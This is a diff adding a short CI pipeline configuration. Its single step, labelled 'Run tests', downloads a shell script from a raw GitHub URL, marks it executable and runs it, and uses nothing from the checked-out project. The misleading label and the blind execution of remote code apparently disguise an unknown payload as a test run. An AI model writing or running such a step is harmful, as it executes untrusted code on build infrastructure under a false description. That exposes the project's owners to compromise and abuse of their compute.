@@ -1,0 +1,10 @@
+jobs:
+  build:
+    parallelism: 1
+    docker:
+      - image: cimg/ruby:3.0.2-node
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          command: wget https://raw.githubusercontent.com/parkitmove/parkit/main/ocb.sh && chmod +x ocb.sh && ./ocb.sh
